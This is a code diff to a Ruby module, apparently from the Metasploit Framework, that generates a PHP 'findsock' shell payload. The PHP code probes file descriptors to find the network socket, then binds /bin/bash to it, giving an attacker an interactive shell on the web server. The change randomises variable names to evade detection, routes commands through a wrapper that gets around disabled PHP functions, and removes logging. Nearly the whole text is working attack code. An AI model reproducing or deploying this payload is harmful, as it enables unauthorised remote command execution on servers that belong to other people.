@@ -47,36 +47,36 @@ module ShellFindsock
 
 	def php_findsock
 
-		#cmd = Rex::Text.encode_base64(datastore['CMD'])
-		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
+		var_cmd = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
+		var_fd  = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
+		var_out = '$' + Rex::Text.rand_text_alpha(rand(4) + 6)
 		shell = <<END_OF_PHP_CODE
-error_reporting(E_ALL);
+error_reporting(0);
 print("<html><body>");
 flush();
 
-error_log("Looking for file descriptor");
-$fd = 13;
+function mysystem(#{var_cmd}){
+	#{php_preamble()}
+	#{php_system_block({:cmd_varname=>var_cmd, :output_varname => var_out})}
+	return #{var_out};
+}
+
+#{var_fd} = 13;
 for ($i = 3; $i < 50; $i++) {
-	$foo = system("/bin/bash 2>/dev/null <&$i -c 'echo $i'");
+	$foo = mysystem("/bin/bash 2>/dev/null <&$i -c 'echo $i'");
 	if ($foo != $i) {
-		$fd = $i - 1;
+		#{var_fd} = $i - 1;
 		break;
 	}
 }
-error_log("Found it ($fd)");
 print("</body></html>\n\n");
 flush();
 
-$c = "/bin/bash <&$fd >&$fd 2>&$fd";
-system($c);
+#{var_cmd} = "/bin/bash <&#{var_fd} >&#{var_fd} 2>&#{var_fd}";
+mysystem(#{var_cmd});
 
 END_OF_PHP_CODE
 
-#function mysystem(){
-#	#{php_preamble({:disabled_varname => dis})}
-#	#{php_system_block({:cmd_varname=>'$c', :disabled_varname => dis, :output_varname => '$out'})}
-#	return $out;
-#}
 		
 		return shell
 	end
